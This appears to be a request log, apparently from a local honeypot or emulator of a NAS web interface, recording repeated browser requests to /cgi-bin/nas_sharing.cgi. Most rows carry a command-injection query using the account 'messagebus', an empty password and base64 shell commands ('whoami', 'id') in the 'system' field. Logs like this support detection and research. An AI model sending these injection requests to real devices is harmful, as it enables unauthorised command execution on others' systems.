"1712605390","127.0.0.1","Host: localhost
Connection: keep-alive
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi"
"1712605391","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi"
"1712605396","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi"
"1712605426","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi"
"1712605441","127.0.0.1","Host: localhost
Connection: keep-alive
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=coucou"
"1712605442","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=coucou"
"1712605443","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=coucou"
"1712605443","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=coucou"
"1712605444","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=coucou"
"1712605481","127.0.0.1","Host: localhost
Connection: keep-alive
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=%3CBASE64_CMD%3E"
"1712605490","127.0.0.1","Host: localhost
Connection: keep-alive
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605650","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605650","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605651","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605651","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605660","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605660","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605660","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605661","127.0.0.1","Host: localhost
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605661","127.0.0.1","Host: localhost
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605666","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605667","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605667","127.0.0.1","Host: localhost
Connection: keep-alive
Cache-Control: max-age=0
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=d2hvYW1p"
"1712605681","127.0.0.1","Host: localhost
Connection: keep-alive
sec-ch-ua: ""Brave"";v=""123"", ""Not:A-Brand"";v=""8"", ""Chromium"";v=""123""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br, zstd
Cookie: connect.sid=s%3AFL8-0OLrEl2FuLmScUh6tr20Cogphdny.Q08RAfY8dAnpdWCckbPRHEE%2Bj64Z2Qms8jORV8n7bxM

","/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ="
